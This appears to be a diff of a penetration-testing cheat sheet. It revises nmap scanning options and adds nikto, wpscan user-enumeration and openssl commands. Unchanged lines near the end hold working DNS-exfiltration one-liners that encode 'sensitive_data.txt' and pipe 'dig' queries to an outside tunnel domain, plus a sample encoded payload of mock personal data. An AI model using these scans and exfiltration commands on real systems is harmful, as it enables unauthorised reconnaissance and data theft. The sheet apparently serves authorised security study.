@@ -4,34 +4,14 @@
 
 # NMAP BASICS
 nmap [target] # Scan a single target
-nmap [target1,target2,etc] # Scan multiple targets
-nmap -iL [list.txt] # Scan a list of targets
-nmap [range of IP addresses] # Scan a range of hosts
-nmap [IP address/cidr] # Scan a subnet
-nmap -iR [number] # Scan random hosts
-nmap [targets] –exclude [targets] # Exclude targets from scan
-nmap [targets] –excludefile [list.txt] # Exclude a list of targets
-nmap -A [target] # Aggressive Scanning
-nmap -6 [target] # Scan an IPv6 target
-# DISCOVERY OPTIONS
-nmap -sP [target] # Perform a ping scan
-nmap -sN [target] # Performs Stealth scan with tcp headers set to "Null"
-nmap -PN [target] # Dont ping
-nmap -PS [target] # TCP SYN ping
-nmap -PA [target] # TCP ACK ping
-nmap -PU [target] # UDP ping
-nmap -PY [target] # SCTP Init Ping
-nmap -PE [target] # ICMP echo ping
-nmap -PP [target] # ICMP Timestamp ping
-nmap -PM [target] # ICMP address mask ping
-nmap -PO [target] # IP protocol ping
-nmap -PR [target] # ARP ping
-nmap –traceroute [target] # Traceroute
-nmap -R [target] # Force reverse DNS resolution
-nmap -n [target] # Disable reverse DNS resolution	
-nmap –dns-servers [servers] [target # Alternative DNS lookup
-nmap -sL [targets] # Create a host list
-# More Complex
+nmap [target1, target2, etc] # Scan Multiple Targets
+nmap -O --osscan-guess [target] # Attempt to Guess an Unknown OS
+nmap -sV [target] # Service Version Detection
+nmap -sV --script=banner $ip # Banner Grabbing
+
+
+
+# Nmap: More Complex
 nmap -sC -sV -oN normal.txt target-ip # Enumerate services and use default scripts
 nmap -p- -oN all_ports.txt target-ip # Scan all tcp ports
 nmap -p- -sU -oN all_udp_ports.txt target-ip # Scan all udp ports
@@ -43,6 +23,26 @@ nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> # Nmap fast scan for all th
 nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP> # # Nmap fast scan for all the ports slower to avoid failures due to -T4
 nmap -sU -sV --version-intensity 0 -n -F -T4 <IP> # # Nmap fast check if any of the 100 most common UDP services is running
 nmap -sU -sV -sC -n -F -T4 <IP> # # Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
+
+# =====
+# Nikto
+# =====
+nikto -h $ip:8000
+nikto -h https://$ip:9007 -ssl -C all
+
+# ======
+# wpscan
+# ======
+wpscan --url <your url here> --enumerate u
+
+
+
+
+
+# =======
+# OpenSSL
+# =======
+openssl s_client -connect <IP_address>:443 # Check SSL Certificate
 
 # ======
 # netcat
@@ -171,3 +171,10 @@ cat sensitive_data.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tun
 cat sensitive_data.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
 # Cleaning and restoring Exfiltrated DNS Data
 echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
+nmap -p 80 --script http-headers $ip # Banner Grabbing
+
+
+
+
+
+
